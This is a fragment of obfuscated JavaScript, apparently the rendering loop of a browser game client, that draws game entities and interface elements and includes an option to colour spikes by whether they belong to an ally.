			for (var ⵠᐃ = 0; ⲆᐃⲆΔ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆᐃⲆΔ[ⵠᐃ]);
			var ⵠⵠⵠᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⲆⲆΔᐃ];
			for (var ⵠᐃ = Δᐃᐃᐃ; ⵠᐃ < ⵠⵠⵠᐃΔ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠⵠⵠᐃΔ[ⵠᐃ], Ⲇ.ᐃⲆⲆΔᐃ);
			var ΔⲆᐃⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔⲆᐃⲆⵠ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ΔⲆᐃⲆⵠ[ⵠᐃ]);
			var ᐃΔᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ];
			for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < ᐃΔᐃΔ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ᐃΔᐃΔ[ⵠᐃ]);
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃᐃⵠᐃ];
			for (var ⵠᐃ = 0; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & ΔⵠⲆΔ)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10012 : 10013 : Ⲇ.ΔⵠΔᐃⵠᐃΔ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⵠΔΔ];
			for (var ⵠᐃ = ⲆΔⵠ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & ᐃⲆᐃ)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10014 : 10015 : Ⲇ.ⵠⲆᐃᐃⲆⵠⵠ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⵠⵠᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & 1) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10016 : 10017 : Ⲇ.ΔⵠΔΔⲆⵠΔ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> ΔⲆᐃᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠᐃⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & ΔΔΔ)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10018 : 10019 : Ⲇ.ᐃᐃⲆⵠⲆΔᐃ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆⲆⲆⲆ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & 1) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10020 : 10021 : Ⲇ.ⲆᐃᐃΔⲆᐃΔ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔΔⵠ];
			for (var ⵠᐃ = ⵠⲆⲆ; ⲆⲆΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & ΔⵠⲆΔ) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10022 : 10023 : Ⲇ.ⵠⲆΔΔⵠ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> ΔⵠΔⵠ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔΔⲆ];
			for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & ᐃⲆᐃ)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10024 : 10025 : Ⲇ.ᐃᐃΔΔⲆ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & ΔⲆᐃᐃ) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10026 : 10027 : Ⲇ.ⲆⲆΔⵠⵠ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> ᐃⲆᐃ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃΔΔⲆ];
			for (var ⵠᐃ = ᐃⵠⲆⵠ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & ΔⲆⵠ) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10028 : 10029 : Ⲇ.ⲆᐃΔΔⲆ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⲆᐃᐃ];
			for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & 1)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10030 : 10031 : Ⲇ.ⲆⵠⲆᐃᐃ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> ΔᐃⲆⵠ)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠᐃⲆ];
			for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				!(ⲆⲆΔΔ[ⵠᐃ].info & ΔᐃᐃⲆ) && ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10032 : 10033 : Ⲇ.ⵠΔⵠᐃⲆ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> 1)
			}
			var ⲆⲆΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⲆΔⵠ];
			for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < ⲆⲆΔΔ.length; ⵠᐃ++) {
				if (!(ⲆⲆΔΔ[ⵠᐃ].info & ⵠΔⲆ)) ⵠⵠᐃⲆ(ⲆⲆΔΔ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆⲆΔΔ[ⵠᐃ]) ? 10034 : 10035 : Ⲇ.ⵠⵠⲆΔⵠ);
				ⲆⲆΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆⲆΔΔ[ⵠᐃ].info >> ΔᐃᐃⲆ)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔⵠᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⵠⲆⵠΔΔ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ⲆΔΔⵠᐃ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⵠΔⲆⲆ];
			for (var ⵠᐃ = Ⲇᐃᐃᐃ; ⵠⲆⵠΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ΔⵠΔⲆⲆ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆᐃᐃΔⲆ];
			for (var ⵠᐃ = ΔᐃΔΔ; ⵠᐃ < ⵠⲆⵠΔΔ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ⲆᐃᐃΔⲆ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆᐃᐃ];
			for (var ⵠᐃ = 0; ⵠⲆⵠΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ⲆΔⲆᐃᐃ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃΔᐃΔⵠ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⵠⲆⵠΔΔ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ᐃΔᐃΔⵠ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⵠⲆⵠΔΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔᐃⵠ];
			for (var ⵠᐃ = 0; ⵠⲆⵠΔΔ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⵠⲆⵠΔΔ[ⵠᐃ], Ⲇ.ΔᐃΔᐃⵠ);
				ⵠⲆⵠΔΔ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⵠⲆⵠΔΔ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠⵠΔⲆ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆᐃⲆⵠⵠ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 10010 : 10011 : Ⲇ.ⵠⵠⵠΔⲆ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃΔᐃ];
			for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < ⲆᐃⲆⵠⵠ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 10008 : 10009 : Ⲇ.ⲆΔᐃΔᐃ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔⲆⵠΔ];
			for (var ⵠᐃ = ⵠᐃⲆᐃ; ⵠᐃ < ⲆᐃⲆⵠⵠ.length; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 10006 : 10007 : Ⲇ.ⲆΔⲆⵠΔ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔⵠⲆ];
			for (var ⵠᐃ = ⵠΔⲆⵠ; ⲆᐃⲆⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 10004 : 10005 : Ⲇ.ⲆⲆΔⵠⲆ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆⵠⵠᐃ];
			for (var ⵠᐃ = ⵠⲆⲆ; ⲆᐃⲆⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 10002 : 10003 : Ⲇ.ΔⲆⵠⵠᐃ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var ⲆᐃⲆⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃⲆᐃⲆ];
			for (var ⵠᐃ = ΔᐃΔΔ; ⲆᐃⲆⵠⵠ.length > ⵠᐃ; ⵠᐃ++) {
				ⵠⵠᐃⲆ(ⲆᐃⲆⵠⵠ[ⵠᐃ], Settings.ColoredSpikes.enabled ? isAlly(ⲆᐃⲆⵠⵠ[ⵠᐃ]) ? 1e4 : 10001 : Ⲇ.ⵠᐃⲆᐃⲆ);
				ⲆᐃⲆⵠⵠ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆⵠⵠ[ⵠᐃ].info)
			}
			var Ⲇⵠⵠⵠⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔⲆᐃΔⵠ];
			for (var ⵠᐃ = ⵠⲆᐃⵠ; ⵠᐃ < Ⲇⵠⵠⵠⵠ.length; ⵠᐃ++) {
				var ᐃⵠⵠ = Ⲇⵠⵠⵠⵠ[ⵠᐃ];
				if (0 < ᐃⵠⵠ.info) ⵠⵠᐃⲆ(ᐃⵠⵠ, Ⲇ.ⵠⲆΔΔⵠΔΔ);
				else ⵠⵠᐃⲆ(ᐃⵠⵠ, Ⲇ.ⲆᐃᐃⵠΔⲆⵠ)
			}
			var ⵠΔΔᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔᐃⲆᐃ];
			for (var ⵠᐃ = 0; ⵠΔΔᐃⵠ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⵠΔΔᐃⵠ[ⵠᐃ], Ⲇ.ⲆΔᐃⲆᐃ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ΔⲆⵠⵠ, "g", ΔⵠᐃⲆ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠᐃⲆⲆⲆ, ⵠ[297], ᐃⲆⵠᐃΔ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ΔⲆᐃΔ, "d", 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃᐃΔⵠ, ⵠ[70], 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆΔⲆⲆ, "p", 0);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆⲆᐃᐃ, "m", ⵠΔⲆᐃ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆⵠΔⲆ, "a", 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔᐃᐃ, ⵠ[196], 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆΔⲆᐃ, ⵠ[568], 3, ΔᐃⲆΔ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆΔⲆᐃ, ⵠ[568], ⲆⵠΔΔ, ΔⲆΔΔΔ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆΔⲆᐃ, ⵠ[568], ΔᐃⲆⵠ, ⵠΔΔ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠⲆΔⲆᐃ, ⵠ[568], ⲆⲆⲆᐃ, 0);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃΔⲆⲆⵠ, ⵠ[568], ΔⲆΔᐃ, ⲆⲆΔⲆ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃΔⲆⲆⵠ, ⵠ[568], ⵠΔⲆᐃ, 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃΔⲆⲆⵠ, ⵠ[568], ΔΔΔ, 1);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃΔⲆⲆⵠ, ⵠ[568], 0, 0);
			var ᐃΔᐃⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⲆΔΔᐃ];
			for (var ⵠᐃ = ΔΔⵠ; ᐃΔᐃⵠ.length > ⵠᐃ; ⵠᐃ++) {
				for (var ᐃⵠᐃⵠ = Δᐃᐃⵠ; ᐃΔᐃⵠ[ⵠᐃ].info > ᐃⵠᐃⵠ; ᐃⵠᐃⵠ++) ⵠⵠᐃⲆ(ᐃΔᐃⵠ[ⵠᐃ].ᐃΔᐃⵠ[ᐃⵠᐃⵠ], Ⲇ.ⲆⲆΔΔᐃ)
			}
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃⵠⲆⵠᐃ, "s", 2);
			var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃⵠᐃⲆⵠ];
			for (var ⵠᐃ = Δⵠᐃ; ⵠᐃ < ⲆΔΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔⲆ[ⵠᐃ]);
			var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆΔΔΔᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ⲆΔΔⲆ.length; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔⲆ[ⵠᐃ]);
			var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠΔⵠⵠ];
			for (var ⵠᐃ = 0; ⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔⲆ[ⵠᐃ]);
			var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ᐃᐃΔⲆⲆ];
			for (var ⵠᐃ = 0; ⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔⲆ[ⵠᐃ]);
			var ⲆΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠᐃΔⲆᐃ];
			for (var ⵠᐃ = ΔΔⵠⵠ; ⲆΔΔⲆ.length > ⵠᐃ; ⵠᐃ++) ⵠⵠᐃⲆ(ⲆΔΔⲆ[ⵠᐃ]);
			var ΔΔΔⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔΔⲆᐃᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔΔΔⵠ.length; ⵠᐃ++) ⵠⵠᐃΔⲆⲆⵠ(ΔΔΔⵠ[ⵠᐃ]);
			var ⵠᐃⲆΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⲆΔᐃΔ];
			for (var ⵠᐃ = 0; ⵠᐃⲆΔⲆ.length > ⵠᐃ; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ⵠᐃⲆΔⲆ[ⵠᐃ]);
			var ⵠᐃⲆΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠⵠⵠⲆ];
			for (var ⵠᐃ = 0; ⵠᐃⲆΔⲆ.length > ⵠᐃ; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ⵠᐃⲆΔⲆ[ⵠᐃ]);
			var ΔⲆᐃⲆⵠ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠΔⵠΔᐃ];
			for (var ⵠᐃ = 0; ⵠᐃ < ΔⲆᐃⲆⵠ.length; ⵠᐃ++) {
				ⵠⵠΔⲆ == ΔⲆᐃⲆⵠ[ⵠᐃ].action && ΔⵠᐃᐃⲆΔᐃ(ΔⲆᐃⲆⵠ[ⵠᐃ])
			}
			var ᐃΔᐃΔ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⲆⵠᐃⲆⵠ];
			for (var ⵠᐃ = ⲆⲆⲆᐃ; ⵠᐃ < ᐃΔᐃΔ.length; ⵠᐃ++) {
				ΔⵠᐃᐃⲆΔᐃ(ᐃΔᐃΔ[ⵠᐃ])
			}
			var ⵠᐃΔΔⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ⵠⵠᐃⲆⵠ];
			for (var ⵠᐃ = ΔΔⵠ; ⵠᐃ < ⵠᐃΔΔⲆ.length; ⵠᐃ++) ΔⵠᐃᐃⲆΔᐃ(ⵠᐃΔΔⲆ[ⵠᐃ]);
			var ⲆᐃⲆᐃᐃⲆⲆ = ⲆⲆⲆ.ΔⲆᐃ[ⲆⲆᐃ.ΔᐃΔⲆᐃ];
			for (var ⵠᐃ = ᐃⵠΔ; ⲆᐃⲆᐃᐃⲆⲆ.length > ⵠᐃ; ⵠᐃ++) {
				ΔⵠᐃᐃⲆΔᐃ(ⲆᐃⲆᐃᐃⲆⲆ[ⵠᐃ]);
				ⲆᐃⲆᐃᐃⲆⲆ[ⵠᐃ].ᐃΔᐃⵠᐃ(ⲆᐃⲆᐃᐃⲆⲆ[ⵠᐃ].info)
			}
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⵠᐃΔᐃΔ, "c", 0);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔΔΔ, "t", 5, ᐃⵠⵠΔ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ᐃⲆⲆⵠⵠ, "f", ᐃⲆⵠᐃΔ, 2);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆᐃᐃⲆⵠ, ⵠ[138], 0, ᐃⵠⲆⵠ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆⵠⲆⵠⵠ, "b", 3, ⲆⲆΔᐃ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆΔΔΔ, "t", ᐃᐃⵠⲆᐃ, Ⲇᐃᐃⵠ);
			ᐃΔΔⵠΔ(ᐃᐃⲆᐃⵠ, ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, Ⲇ.ⲆⵠⲆⵠⵠ, "b", ΔᐃⲆⵠ, 0);
